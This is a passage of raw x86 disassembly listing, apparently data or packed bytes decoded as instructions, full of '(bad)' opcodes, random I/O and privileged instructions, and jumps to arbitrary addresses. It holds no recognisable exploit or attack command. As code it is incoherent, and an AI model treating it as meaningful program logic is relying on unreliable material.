  4af9bb:	xor    BYTE PTR [ebp+0x9],ah
  4af9be:	push   0x7300110a
  4af9c3:	loopne 0x4afa08
  4af9c5:	and    edx,DWORD PTR [ecx]
  4af9c7:	pop    ebp
  4af9c8:	jno    0x4afa43
  4af9ca:	inc    ebp
  4af9cb:	and    eax,0x9e69d16c
  4af9d0:	lods   al,BYTE PTR ds:[esi]
  4af9d1:	inc    ebx
  4af9d2:	je     0x4afa1e
  4af9d4:	dec    edx
  4af9d5:	aad    0x38
  4af9d7:	scas   al,BYTE PTR es:[edi]
  4af9d8:	std    
  4af9d9:	mov    eax,DWORD PTR [esp+ebp*4-0x427f3d0c]
  4af9e0:	ds ins DWORD PTR es:[edi],dx
  4af9e2:	push   ss
  4af9e3:	inc    ecx
  4af9e4:	mov    esp,0x36bbd49e
  4af9e9:	and    cl,BYTE PTR [edi]
  4af9eb:	sbb    DWORD PTR [eax+0x25],0xffffff8d
  4af9ef:	push   ebp
  4af9f0:	lock call 0x7c54:0x845bc953
  4af9f8:	das    
  4af9f9:	jne    0x4af9d2
  4af9fb:	add    eax,0xad00c
  4afa00:	aad    0xd0
  4afa02:	dec    edi
  4afa03:	sahf   
  4afa04:	or     al,0x9a
  4afa06:	cmp    al,0x5a
  4afa08:	pop    es
  4afa09:	push   es
  4afa0a:	add    DWORD PTR [edi],esp
  4afa0c:	or     eax,DWORD PTR [edx]
  4afa0e:	mov    DWORD PTR [edi+0x18],esi
  4afa11:	es out 0xdc,al
  4afa14:	or     dh,al
  4afa16:	inc    eax
  4afa17:	push   cs
  4afa18:	out    0x65,al
  4afa1a:	lock xor cl,BYTE PTR [eax+0x79]
  4afa1e:	xor    ch,al
  4afa20:	xchg   edx,eax
  4afa21:	(bad)  
  4afa22:	xor    DWORD PTR [eax],esi
  4afa24:	cmp    DWORD PTR [eax+0x2a],edx
  4afa27:	sbb    al,BYTE PTR [ebx+0x6]
  4afa2a:	jne    0x4af9fb
  4afa2c:	xor    al,0x47
  4afa2e:	mov    BYTE PTR [edx],bl
  4afa30:	jp     0x4af9e7
  4afa32:	jmp    0x4af9c4
  4afa34:	ret    0xe0ae
  4afa37:	push   edi
  4afa38:	xor    BYTE PTR ds:0x41d34f52,dh
  4afa3e:	jecxz  0x4af9c9
  4afa40:	or     al,0xb4
  4afa42:	and    al,BYTE PTR [ecx]
  4afa44:	shl    ah,0x8a
  4afa47:	inc    eax
  4afa48:	adc    ah,ah
  4afa4a:	or     al,0x49
  4afa4c:	or     dl,bh
  4afa4e:	and    al,0xbe
  4afa50:	sub    DWORD PTR [ebp+edi*8-0x448f478],esp
  4afa57:	mov    dl,0x8c
  4afa59:	test   al,0xba
  4afa5b:	or     edi,DWORD PTR [ebx]
  4afa5d:	test   al,0x20
  4afa5f:	adc    ebp,DWORD PTR [edx+0x38]
  4afa62:	sub    al,0xcf
  4afa64:	add    al,0x10
  4afa66:	(bad)  
  4afa68:	scas   eax,DWORD PTR es:[edi]
  4afa69:	add    DWORD PTR ds:0xcc80262,esi
  4afa6f:	jmp    FWORD PTR [edx+0x20]
  4afa72:	lds    eax,FWORD PTR [ebp+0x26b128a8]
  4afa78:	push   ebp
  4afa79:	or     cl,BYTE PTR [edx+edi*8]
  4afa7c:	cmp    DWORD PTR [ebx],eax
  4afa7e:	xor    BYTE PTR [edx],al
  4afa80:	aam    0x4b
  4afa82:	jbe    0x4afa75
  4afa84:	sub    bl,al
  4afa86:	inc    ebx
  4afa87:	jno    0x4afa93
  4afa89:	fcom   DWORD PTR [esi-0x55]
  4afa8c:	js     0x4afab3
  4afa8e:	dec    edx
  4afa8f:	in     eax,0xf4
  4afa91:	jge    0x4afa15
  4afa93:	adc    ah,al
  4afa95:	pop    es
  4afa96:	popa   
  4afa97:	push   0xffffffec
  4afa99:	push   edx
  4afa9a:	sbb    edi,DWORD PTR [eax]
  4afa9c:	dec    esp
  4afa9d:	jle    0x4afab3
  4afa9f:	cmp    eax,0xd4458d0c
  4afaa4:	or     ah,BYTE PTR ds:0x32d27c9e
  4afaaa:	xor    eax,0xeec78055
  4afaaf:	inc    edi
  4afab0:	push   ss
  4afab1:	push   ds
  4afab2:	inc    ebp
  4afab3:	xor    BYTE PTR [edi-0x78],0xff
  4afab7:	(bad)  
  4afab8:	ret    0x682d
  4afabb:	test   al,0x25
  4afabd:	rol    DWORD PTR [ecx],0xde
  4afac0:	loopne 0x4afadc
  4afac2:	pop    ebx
  4afac3:	mov    eax,0x47740480
  4afac8:	or     DWORD PTR [ecx-0x40],eax
  4afacb:	push   edx
  4afacc:	inc    esi
  4afacd:	sbb    ch,BYTE PTR [esi-0x2b0fade1]
  4afad3:	in     al,0x0
  4afad5:	lea    ebp,[edi+0x41]
  4afad8:	sbb    DWORD PTR [eax-0x77],esp
  4afadb:	mov    DWORD PTR [esi],edi
  4afadd:	lock call 0xfd5e42ef
  4afae3:	ds xchg edx,eax
  4afae5:	sub    edx,DWORD PTR ds:0x8c354381
  4afaeb:	xchg   edi,eax
  4afaec:	out    0x98,eax
  4afaee:	sbb    DWORD PTR [ebp+0x18e7610],0xffffffec
  4afaf5:	ffreep st(2)
  4afaf7:	mov    eax,ds:0x8f08e664
  4afafc:	mov    ds:0x18276e7d,al
  4afb01:	sub    DWORD PTR [edx+0x58],0xffffff8e
  4afb05:	fist   DWORD PTR [eax+0x48]
  4afb08:	icebp  
  4afb09:	sbb    esp,DWORD PTR [eax+0xbe85d0a]
  4afb0f:	adc    al,0xc2
  4afb11:	jge    0x4afb12
  4afb13:	lea    edi,[ebp+0x2b5cfeb9]
  4afb19:	enter  0x4890,0x28
  4afb1d:	loope  0x4afb28
  4afb1f:	push   es
  4afb20:	push   esp
  4afb21:	fistp  QWORD PTR [eax-0x2e]
  4afb24:	cmp    bl,bh
  4afb26:	pop    eax
  4afb27:	pop    ebp
  4afb28:	adc    BYTE PTR [ebx],bh
  4afb2a:	mov    dx,WORD PTR [eax-0x2a89edb0]
  4afb31:	aam    0x43
  4afb33:	rcl    edx,cl
  4afb35:	push   eax
  4afb36:	xor    ah,BYTE PTR [esi+0x299f1b0]
  4afb3c:	cmp    ebx,eax
  4afb3e:	(bad)  
  4afb3f:	pusha  
  4afb40:	loopne 0x4afb86
  4afb42:	or     ah,cl
  4afb44:	adc    BYTE PTR [esi+edx*4+0x3],bh
  4afb48:	add    bl,BYTE PTR [ebx+0x4]
  4afb4b:	scas   eax,DWORD PTR es:[edi]
  4afb4c:	rcr    edi,cl
  4afb4e:	aaa    
  4afb4f:	stos   BYTE PTR es:[edi],al
  4afb50:	mov    bl,BYTE PTR [edx+0x12]
  4afb53:	push   esi
  4afb54:	stos   DWORD PTR es:[edi],eax
  4afb55:	je     0x56f3618c
  4afb5b:	xchg   DWORD PTR [edi],esi
  4afb5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4afb5e:	imul   edx,DWORD PTR [eax],0x26dbe524
  4afb64:	pushf  
  4afb65:	int    0x38
  4afb67:	sbb    eax,0xcb100167
  4afb6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4afb6d:	stc    
  4afb6e:	push   0x16
  4afb70:	lods   al,BYTE PTR ds:[esi]
  4afb71:	lods   eax,DWORD PTR ds:[esi]
  4afb72:	pop    eax
  4afb73:	wbinvd 
  4afb75:	clc    
  4afb76:	mov    ds:0x119e5506,al
  4afb7b:	add    BYTE PTR [ebx],dh
  4afb7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4afb7e:	xor    al,0xc
  4afb80:	pop    eax
  4afb81:	xchg   esi,eax
  4afb82:	test   al,0xc5
  4afb84:	addr16 inc edx
  4afb86:	nop
  4afb87:	ds push esi
  4afb89:	sub    al,0x25
  4afb8b:	aas    
  4afb8c:	sbb    BYTE PTR [esi],ch
  4afb8e:	xor    BYTE PTR [esi],cl
  4afb90:	lods   al,BYTE PTR ds:[esi]
  4afb91:	sbb    DWORD PTR [ebp-0x7ebf2ce8],ecx
  4afb97:	inc    esp
  4afb98:	add    eax,0xf6b6aa11
  4afb9d:	adc    DWORD PTR [esi+ebx*4+0x34],0x56455b52
  4afba5:	pop    edx
  4afba6:	push   es
  4afba7:	ss pop esp
  4afba9:	ins    BYTE PTR es:[edi],dx
  4afbaa:	ds out dx,eax
  4afbac:	imul   esi,DWORD PTR [eax-0x4e],0x5da3b416
  4afbb3:	cmp    ebx,DWORD PTR [esi-0xa]
  4afbb6:	imul   eax,DWORD PTR [edx+0x6d853d3],0xe60c262
  4afbc0:	mov    ebx,0xb1cd3e24
  4afbc5:	pop    ebx
  4afbc6:	repnz ds popa 
  4afbc9:	and    cl,BYTE PTR [esi]
  4afbcb:	add    DWORD PTR [ebp+0x2ff8080],esp
  4afbd1:	push   cs
  4afbd2:	add    ecx,DWORD PTR [esi]
  4afbd4:	add    al,0xe
  4afbd6:	add    eax,0x67533c0f
  4afbdb:	std    
  4afbdc:	and    BYTE PTR [esp+ecx*1],cl
  4afbdf:	push   cs
  4afbe0:	or     eax,0xb2e95998
  4afbe5:	jne    0x4afc0f
  4afbe7:	pop    ecx
  4afbe8:	repnz mov BYTE PTR [eax],al
  4afbeb:	les    edi,FWORD PTR [eax+0x0]
  4afbee:	add    eax,0x58547a53
  4afbf3:	mov    eax,ds:0x40415563
  4afbf8:	sub    cl,cl
  4afbfa:	xchg   edi,eax
  4afbfb:	mov    eax,0x32496d08
  4afc00:	xor    BYTE PTR [eax],bl
  4afc02:	rcl    BYTE PTR [edi],cl
  4afc04:	xor    al,BYTE PTR [edx+0x1d]
  4afc07:	dec    esp
  4afc08:	aam    0xac
  4afc0a:	pop    ecx
  4afc0b:	iret   
  4afc0c:	retf   0x393
  4afc0f:	or     DWORD PTR [ebx-0x73ba1efa],eax
  4afc15:	jle    0x4afc2b
  4afc17:	hlt    
  4afc18:	stos   BYTE PTR es:[edi],al
  4afc19:	push   edx
  4afc1a:	gs out 0x3,eax
  4afc1d:	and    BYTE PTR [ebx],bh
  4afc1f:	cmp    ah,dl
  4afc21:	or     al,bl
  4afc23:	lods   eax,DWORD PTR ds:[esi]
  4afc24:	(bad)  
  4afc25:	mov    ds:0x148ee956,al
  4afc2a:	push   0xffffffea
  4afc2c:	sbb    eax,ebx
  4afc2e:	add    eax,0x1b1075e1
  4afc33:	xor    BYTE PTR [ebx],al
  4afc35:	push   eax
  4afc36:	push   edx
  4afc37:	xchg   edx,eax
  4afc38:	cmp    eax,0x16360d7d
  4afc3d:	fist   DWORD PTR [eax+0x69]
  4afc40:	in     al,dx
  4afc41:	test   DWORD PTR [ebp-0x2e],ecx
  4afc44:	sbb    DWORD PTR [edi+0x21a4ccf4],eax
  4afc4a:	xchg   BYTE PTR [ebx],bl
  4afc4c:	sbb    BYTE PTR [ecx+0x54],bl
  4afc4f:	loope  0x4afc28
  4afc51:	or     BYTE PTR [ecx-0x61],0x24
  4afc55:	cdq    
  4afc56:	in     al,dx
  4afc57:	imul   ecx,DWORD PTR [eax+0x1a14f4a1],0xa9072107
  4afc61:	pop    esp
  4afc62:	call   0x104d:0x24500148
  4afc69:	in     eax,0x4d
  4afc6b:	inc    eax
  4afc6c:	out    0x89,eax
  4afc6e:	dec    esi
  4afc6f:	and    al,0x15
  4afc71:	sub    BYTE PTR [ebp-0x434b6e7f],ch
  4afc77:	inc    eax
  4afc78:	daa    
  4afc79:	mov    ds:0xda27ff07,al
  4afc7e:	ins    DWORD PTR es:[edi],dx
  4afc7f:	add    al,0x64
  4afc81:	push   es
  4afc82:	ror    DWORD PTR [ebx+ebx*8-0x7a],1
  4afc86:	mov    DWORD PTR [ebp*8+0x67b72af4],edi
  4afc8d:	mov    dh,0xfa
  4afc8f:	mov    ebp,0x9a2e1c45
  4afc94:	push   ds
  4afc95:	enter  0x1520,0x54
  4afc99:	add    bh,ch
  4afc9b:	arpl   WORD PTR [eax],ax
  4afc9d:	mov    BYTE PTR [esi+0x74],bl
  4afca0:	push   cs
  4afca1:	in     eax,dx
  4afca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4afca3:	(bad)  
  4afca4:	pop    edx
  4afca5:	add    eax,0x5854b813
  4afcaa:	aaa    
  4afcab:	cmc    
  4afcac:	nop
  4afcad:	jnp    0x4afcc9
  4afcaf:	lods   eax,DWORD PTR ds:[esi]
  4afcb0:	adc    dh,cl
  4afcb2:	test   BYTE PTR [esi+0x1],bl
  4afcb5:	shl    BYTE PTR [ecx],1
  4afcb7:	lahf   
  4afcb8:	add    al,0x21
  4afcba:	or     BYTE PTR [esi],bh
  4afcbc:	cmp    eax,0x8798ad48
  4afcc1:	or     al,0x20
  4afcc3:	out    dx,al
  4afcc4:	fstp   QWORD PTR [bx]
  4afcc7:	push   edi
  4afcc8:	mov    DWORD PTR [esi+0x74968930],ecx
  4afcce:	or     dh,ah
  4afcd0:	and    edi,DWORD PTR [ebp+0x1d]
  4afcd3:	stos   DWORD PTR es:[edi],eax
  4afcd4:	cmp    eax,DWORD PTR [esi+0x3b08d278]
  4afcda:	mov    ?,WORD PTR [edi+eiz*2+0x4b]
  4afcde:	xor    al,BYTE PTR [eax+0x34c5e969]
  4afce4:	(bad)  
  4afce5:	ds daa 
  4afce7:	mov    DWORD PTR [ebx],esp
  4afce9:	jl     0x4afcf6
  4afceb:	push   ecx
  4afcec:	cli    
  4afced:	cmc    
  4afcee:	push   esi
  4afcef:	fimul  DWORD PTR [edi+0x4ba95380]
  4afcf5:	sbb    BYTE PTR [ecx-0x4e],dl
  4afcf8:	mov    esp,0x85b01c53
  4afcfd:	in     al,dx
  4afcfe:	mov    edx,esp
  4afd00:	clc    
  4afd01:	push   edx
  4afd02:	shr    edi,0xf
  4afd05:	pop    ds
  4afd06:	out    dx,al
  4afd07:	and    eax,0xe8e47c00
  4afd0c:	pslld  mm7,QWORD PTR [esi+0x5b198f80]
  4afd13:	loopne 0x4afcaa
  4afd15:	je     0x4afd93
  4afd17:	outs   dx,BYTE PTR ds:[esi]
  4afd18:	cmp    BYTE PTR [esi-0x529a8bb5],0xe0
  4afd1f:	sub    eax,0x143adf03
  4afd24:	push   ecx
  4afd25:	pushf  
  4afd26:	stc    
  4afd27:	xchg   ecx,eax
  4afd28:	test   DWORD PTR [ebx],0x8f44ebc0
  4afd2e:	push   edx
  4afd2f:	mov    dh,0xf8
  4afd31:	mov    WORD PTR [eax],fs
  4afd33:	add    DWORD PTR ss:[ebp-0x33ca78e0],edx
  4afd3a:	xor    BYTE PTR [ecx-0x57],0xb0
  4afd3e:	inc    esp
  4afd3f:	adc    BYTE PTR [edi],bl
  4afd41:	mov    ebx,0xebfa5770
  4afd46:	or     eax,DWORD PTR [ecx]
  4afd48:	sub    DWORD PTR ss:[eax+0x5b],ebx
  4afd4c:	sub    ah,dh
  4afd4e:	call   0x32cbbfeb
  4afd53:	mov    bh,0x63
  4afd55:	mov    DWORD PTR [edx],eax
  4afd57:	or     eax,0x14053a14
  4afd5c:	adc    DWORD PTR [edx],ebp
  4afd5e:	jl     0x4afdcd
  4afd60:	icebp  
  4afd61:	pusha  
  4afd62:	shl    BYTE PTR ds:0xebf7fd76,0xb
  4afd69:	ja     0x4afd72
  4afd6b:	arpl   WORD PTR [ebx+0x648bf6],dx
  4afd71:	jp     0x4afde2
  4afd73:	add    al,bh
  4afd75:	sub    cl,BYTE PTR [eax-0x575eaeeb]
  4afd7b:	pop    ebx
  4afd7c:	push   ecx
  4afd7d:	push   esp
  4afd7e:	daa    
  4afd7f:	scas   eax,DWORD PTR es:[edi]
  4afd80:	cmp    DWORD PTR [ecx+0x75],esi
  4afd83:	push   esp
  4afd84:	sub    al,0x85
  4afd86:	test   DWORD PTR [ebp-0x7bfbc87f],ebp
  4afd8c:	adc    DWORD PTR [ecx-0x377c96db],edi
  4afd92:	(bad)  
  4afd93:	cmp    al,0x51
  4afd95:	adc    dl,dh
  4afd97:	push   ebx
  4afd98:	inc    edi
  4afd99:	add    eax,0x4515090a
  4afd9e:	sbb    eax,0xdb1f98b4
  4afda3:	mov    ch,0xdf
  4afda5:	xchg   esp,eax
  4afda6:	xchg   edi,eax
  4afda7:	retf   
  4afda8:	cli    
  4afda9:	xor    eax,0xd894689
  4afdae:	nop
  4afdaf:	mov    dl,0x92
  4afdb1:	icebp  
  4afdb2:	jmp    0x4afded
  4afdb4:	pop    ss
  4afdb5:	jae    0x4afd5e
  4afdb7:	mov    WORD PTR [esi],fs
  4afdb9:	mov    WORD PTR [ebx],ss
  4afdbb:	xchg   edi,eax
  4afdbc:	mov    cl,0xee
  4afdbe:	mov    al,ds:0xad05c035
  4afdc3:	repz mov cl,0xa1
  4afdc6:	pop    ebp
  4afdc7:	xor    al,0x2
  4afdc9:	add    BYTE PTR [ebx-0x7a59cc01],0x23
  4afdd0:	popa   
  4afdd1:	jl     0x4afd55
  4afdd3:	cmp    DWORD PTR [ebx+0x50485042],ecx
  4afdd9:	and    BYTE PTR [eax],al
  4afddb:	outs   dx,DWORD PTR ds:[esi]
  4afddc:	ret    0x22fa
  4afddf:	xchg   ebp,eax
  4afde0:	aas    
  4afde1:	and    DWORD PTR [eax+0x193a0686],0xfffffff9
  4afde8:	mov    ebp,0x269a92e8
  4afded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4afdee:	lock add al,0xb
  4afdf1:	inc    esp
  4afdf3:	and    esp,ebx
  4afdf5:	inc    eax
  4afdf6:	push   ss
  4afdf7:	pop    ds
  4afdf8:	lods   al,BYTE PTR ds:[esi]
  4afdf9:	inc    eax
  4afdfa:	or     al,0x56
  4afdfc:	fwait
  4afdfd:	sbb    al,BYTE PTR [ebx-0x3641bf4a]
  4afe03:	sbb    al,0x30
  4afe05:	xor    al,0x74
  4afe07:	mov    es,WORD PTR [ebp+0x6]
  4afe0a:	fs repz in eax,dx
  4afe0d:	pop    esi
  4afe0e:	inc    esi
  4afe0f:	add    eax,0x568b1e72
  4afe14:	inc    edx
  4afe15:	adc    BYTE PTR [ebx],cl
  4afe17:	retf   
  4afe18:	int    0x1e
  4afe1a:	jo     0x4afe87
  4afe1c:	sahf   
  4afe1d:	mov    WORD PTR [esi],es
  4afe1f:	jb     0x4afe66
  4afe21:	leave  
  4afe22:	or     BYTE PTR [edx],dh
  4afe24:	mov    al,0x14
  4afe26:	inc    ebp
  4afe27:	xor    dh,BYTE PTR [ecx-0x38]
  4afe2a:	mov    eax,0x2414c31b
  4afe2f:	add    esi,ebp
  4afe31:	out    0x19,eax
  4afe33:	out    dx,al
  4afe34:	dec    ebx
  4afe35:	not    DWORD PTR [eax+edx*8]
  4afe38:	call   0xe90b0960
  4afe3d:	add    bl,BYTE PTR [ecx]
  4afe3f:	pop    es
  4afe40:	stos   BYTE PTR es:[edi],al
  4afe41:	loopne 0x4afe48
  4afe43:	mov    ebp,0xc2a32cc8
  4afe48:	xor    edx,DWORD PTR [edx]
  4afe4a:	mov    al,0xb0
  4afe4c:	mov    al,ds:0x7aa2102f
  4afe51:	pop    ecx
  4afe52:	cwde   
  4afe53:	sbb    BYTE PTR [ebx-0x6747cc4c],dh
  4afe59:	mov    ch,0xc0
  4afe5b:	in     al,0xd5
  4afe5d:	push   esi
  4afe5e:	inc    ecx
  4afe5f:	mov    esi,0x45e3483e
  4afe64:	inc    esi
  4afe65:	add    eax,0xcf4f126f
  4afe6a:	add    al,0x4a
  4afe6c:	mov    esp,0x850c230f
  4afe71:	xchg   ebx,eax
  4afe72:	rol    BYTE PTR [ecx],0x20
  4afe75:	in     al,0x14
  4afe77:	add    al,0x2
  4afe79:	sbb    eax,0x2a80dc0
  4afe7e:	in     al,0x92
  4afe80:	addr16 repz inc esi
  4afe83:	inc    eax
  4afe84:	add    al,0x8
  4afe86:	or     BYTE PTR [ecx-0xb14f93f],ch
  4afe8c:	cmp    BYTE PTR [edx+0x1a],dh
  4afe8f:	jae    0x4aff02
  4afe91:	ret    0x6076
  4afe94:	cwde   
  4afe95:	les    edi,FWORD PTR [edi]
  4afe97:	or     dl,BYTE PTR [ebx-0x5c]
  4afe9a:	mov    dl,BYTE PTR [eax]
  4afe9c:	sbb    DWORD PTR [eax],ebp
  4afe9e:	sbb    al,0x62
  4afea0:	mov    al,ds:0x92855671
  4afea5:	jbe    0x4afe3e
  4afea7:	imul   esp,DWORD PTR fs:[edx],0x64
  4afeab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4afeac:	ret    
  4afead:	test   al,0x40
  4afeaf:	and    dh,cl
  4afeb1:	xchg   DWORD PTR ds:0xa43ee4be,esp
  4afeb7:	push   eax
  4afeb8:	pop    ss
  4afeb9:	mov    ecx,DWORD PTR [edi-0x226ac4df]
  4afebf:	add    esp,DWORD PTR [edi+0x4f577252]
  4afec5:	and    BYTE PTR [edi+0x7],cl
  4afec8:	cld    
  4afec9:	or     al,0xf5
  4afecb:	cwde   
  4afecc:	push   0x13
  4afece:	call   0xb5a1:0x5643b805
  4afed5:	or     ebp,DWORD PTR [ebp+0x3]
  4afed8:	sub    DWORD PTR [ecx],ecx
  4afeda:	push   ds
  4afedb:	loope  0x4afe5e
  4afedd:	push   ebp
  4afede:	adc    DWORD PTR [edi-0x7ec390ad],esi
  4afee4:	test   DWORD PTR [ecx],ecx
  4afee6:	sahf   
  4afee7:	stos   DWORD PTR es:[edi],eax
  4afee8:	fiadd  DWORD PTR [edi-0x1f]
  4afeeb:	inc    ecx
  4afeec:	mov    bl,0xe0
  4afeee:	out    dx,eax
  4afeef:	push   eax
  4afef0:	aad    0x6a
  4afef2:	dec    ebx
  4afef3:	or     DWORD PTR [ebp+0x5318ebdb],0x4a831539
  4afefd:	rcr    dl,1
  4afeff:	ror    BYTE PTR [ebx],1
  4aff01:	call   0x2dabb59f
  4aff06:	fs pop esp
  4aff08:	or     eax,0x3ded5e52
  4aff0d:	js     0x4aff2d
  4aff0f:	xchg   DWORD PTR [edi-0x7594e2e1],ebx
  4aff15:	adc    eax,0x5e34e8c1
  4aff1a:	out    0x41,al
  4aff1c:	retf   
  4aff1d:	js     0x4aff72
  4aff1f:	pop    ecx
  4aff20:	sbb    ah,BYTE PTR [ebp+0x28]
  4aff23:	fwait
  4aff24:	and    cl,bl
  4aff26:	outs   dx,BYTE PTR ds:[esi]
  4aff27:	fst    QWORD PTR [eax-0x28]
  4aff2a:	add    dl,BYTE PTR [eax+0x68]
  4aff2d:	adc    ah,BYTE PTR [ebx+0xd04ad49]
  4aff33:	js     0x4aff17
  4aff35:	into   
  4aff36:	adc    DWORD PTR [ebx],ebp
  4aff38:	les    ebx,FWORD PTR [eax]
  4aff3a:	test   BYTE PTR [eax+0x23b98415],0xe0
  4aff41:	sbb    eax,0x5f86913a
  4aff46:	jne    0x4afeec
  4aff48:	jo     0x4aff32
  4aff4a:	pop    edi
  4aff4b:	adc    eax,0x2b84a8c6
  4aff50:	jne    0x4afeee
  4aff52:	sub    ebx,DWORD PTR [ebp-0x60]
  4aff55:	jl     0x4aff3c
  4aff57:	and    bl,BYTE PTR [esi-0x75]
  4aff5a:	xchg   esp,eax
  4aff5b:	inc    esi
  4aff5c:	inc    ebx
  4aff5d:	mov    al,ds:0xb0bc6f0d
  4aff62:	out    0x8d,al
  4aff64:	je     0x4aff7f
  4aff66:	push   eax
  4aff67:	mov    dh,0xb1
  4aff69:	jno    0x4aff9c
  4aff6b:	je     0x4aff65
  4aff6d:	aam    0x24
  4aff6f:	mov    ah,0x11
  4aff71:	mov    ah,0x91
  4aff73:	in     al,dx
  4aff74:	xchg   ebp,eax
  4aff75:	js     0x4affe1
  4aff77:	rcr    al,cl
  4aff79:	xchg   edx,eax
  4aff7a:	inc    ebp
  4aff7b:	stos   BYTE PTR es:[edi],al
  4aff7c:	push   0xc018ec8e
  4aff81:	mul    BYTE PTR [ecx+0x32099e48]
  4aff87:	sub    eax,esi
  4aff89:	adc    BYTE PTR [esi+0x5],bh
  4aff8c:	outs   dx,BYTE PTR ds:[esi]
  4aff8d:	ins    DWORD PTR es:[edi],dx
  4aff8e:	enter  0xa1da,0x17
  4aff92:	fdivr  QWORD PTR [ebx]
  4aff94:	ret    0x2c3c
  4aff97:	sahf   
  4aff98:	jmp    FWORD PTR [esi]
  4aff9a:	push   ebp
  4aff9b:	in     al,0x2b
  4aff9d:	sar    DWORD PTR [ebx],cl
  4aff9f:	ret    0xc2c2
  4affa2:	das    
  4affa3:	adc    dh,BYTE PTR [ebp+esi*1-0x3efb13d3]
  4affaa:	imul   edx,eax,0xffffffe1
  4affad:	adc    DWORD PTR [esi+0x127bd026],edx
  4affb3:	mov    ebx,0x6f4a0155
  4affb8:	retf   
  4affb9:	pop    esi
  4affba:	xchg   esp,eax
  4affbb:	mov    ds:0xeb694cc2,al
  4affc0:	shl    ebp,1
  4affc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4affc3:	mov    dh,0x92
  4affc5:	add    dh,ah
  4affc7:	stos   DWORD PTR es:[edi],eax
  4affc8:	mov    eax,0x36e44e5c
  4affcd:	mov    ?,WORD PTR [edx+ecx*2]
  4affd0:	pop    eax
  4affd1:	adc    BYTE PTR [ecx+0x28],dl
  4affd4:	pop    esp
  4affd5:	jmp    0x1a33ceda
  4affda:	or     eax,0x2d22c712
  4affdf:	push   ss
  4affe0:	mov    cs,WORD PTR [ebx+edi*2+0x7d4cbe59]
  4affe7:	loope  0x4aff7d
  4affe9:	sar    DWORD PTR [esi+0x7601fe36],1
  4affef:	cmp    cl,BYTE PTR [edi+0x2d]
  4afff2:	and    eax,ebx
  4afff4:	pop    ebp
  4afff5:	test   BYTE PTR [eax-0x3d],dl
  4afff8:	mov    ds:0xf1968587,eax
  4afffd:	cs or  al,0x20
  4b0000:	fwait
  4b0001:	dec    DWORD PTR [ebx+0x19]
  4b0004:	push   edi
  4b0005:	jmp    0x1c3cd4bd
  4b000a:	arpl   WORD PTR [bx+si],ax
  4b000d:	add    BYTE PTR [ebx-0x26cffb85],bl
  4b0013:	mov    eax,0x96dc88b7
  4b0018:	mov    ah,0x42
  4b001a:	and    BYTE PTR [edi-0x1f],ch
  4b001d:	pusha  
  4b001e:	(bad)  
  4b001f:	dec    ebp
  4b0020:	gs fwait
  4b0022:	and    ebx,esp
  4b0024:	or     cl,BYTE PTR [ecx+0x4988210e]
  4b002a:	loop   0x4affc0
  4b002c:	(bad)  
  4b002d:	pop    eax
  4b002e:	popa   
  4b002f:	jns    0x4b009f
  4b0031:	pop    ebx
  4b0032:	fimul  DWORD PTR [ebp-0x25]
  4b0035:	ror    DWORD PTR [eax],cl
  4b0037:	cld    
  4b0038:	push   cs
  4b0039:	or     bh,al
  4b003b:	or     esp,DWORD PTR [edx]
  4b003d:	push   esi
  4b003e:	inc    ecx
  4b003f:	in     al,0x76
  4b0041:	mov    bh,0x20
  4b0043:	push   es
  4b0044:	push   es
  4b0045:	sti    
  4b0046:	push   cs
  4b0047:	jmp    0xb6819668
  4b004c:	cdq    
  4b004d:	pop    ecx
  4b004e:	test   al,0xa1
  4b0050:	cmp    BYTE PTR [esi-0x3e],dh
  4b0053:	dec    ebx
  4b0054:	ret    
  4b0055:	mov    esp,0x32002bb
  4b005a:	jno    0x4b000f
  4b005c:	mov    ch,0x59
  4b005e:	or     al,0x13
  4b0060:	jmp    0x4b0088
  4b0062:	mov    WORD PTR [ecx],fs
  4b0064:	mov    ecx,0x78619331
  4b0069:	adc    ebp,DWORD PTR [eax]
  4b006b:	adc    bl,BYTE PTR [ecx-0xf]
  4b006e:	and    BYTE PTR [ecx+0x389bbbae],ch
  4b0074:	out    0x61,al
  4b0076:	adc    DWORD PTR [ebx-0x57],eax
  4b0079:	loopne 0x4b0095
  4b007b:	add    esi,eax
  4b007d:	mov    edx,edi
  4b007f:	mov    bl,0x75
  4b0081:	sbb    DWORD PTR [ebp-0x73],eax
  4b0084:	lods   eax,DWORD PTR ds:[esi]
  4b0085:	mov    ch,0x51
  4b0087:	sbb    BYTE PTR [edi+0x32816535],bh
  4b008d:	xchg   DWORD PTR [ebp-0x22],edx
  4b0090:	push   ss
  4b0091:	cmp    eax,esi
  4b0093:	push   ebx
  4b0094:	inc    ebx
  4b0095:	stos   DWORD PTR es:[edi],eax
  4b0096:	leave  
  4b0097:	dec    edx
  4b0098:	dec    edx
  4b0099:	lock in al,0x30
  4b009c:	sbb    BYTE PTR [ecx+ecx*4],ch
  4b009f:	push   es
  4b00a0:	idiv   DWORD PTR [ecx]
  4b00a2:	mov    esi,0x37dc7004
  4b00a7:	add    DWORD PTR [esi],ecx
  4b00a9:	inc    edi
  4b00aa:	push   0x9657f88b
  4b00af:	xchg   esp,eax
  4b00b0:	call   0x136f:0xa29055d
  4b00b7:	cmp    al,0x7b
  4b00b9:	push   eax
  4b00ba:	push   0x281e0747
  4b00bf:	inc    edi
  4b00c0:	div    BYTE PTR [eax]
  4b00c2:	inc    edi
  4b00c3:	test   DWORD PTR [esi],ebp
  4b00c5:	loop   0x4b013c
  4b00c7:	out    0xd9,eax
  4b00c9:	sqrtps xmm1,xmm0
  4b00cc:	inc    edi
  4b00cd:	xor    al,0xc9
  4b00cf:	add    edi,DWORD PTR [ecx]
  4b00d1:	int    0xb9
  4b00d3:	fsubr  DWORD PTR [ecx+0x3a]
  4b00d6:	sub    DWORD PTR [eax-0x6],edx
  4b00d9:	mov    esp,0x4289e9c5
  4b00de:	add    bh,BYTE PTR cs:[eax+0x14c8553c]
  4b00e5:	pop    ds
  4b00e6:	or     eax,DWORD PTR [ecx]
  4b00e8:	and    eax,edi
  4b00ea:	push   esp
  4b00eb:	and    DWORD PTR [ebx-0x7b],edx
  4b00ee:	mov    ah,0xf5
  4b00f0:	mov    cl,0x55
  4b00f2:	enter  0xbbb0,0xf0
  4b00f6:	mov    edi,0x3329b701
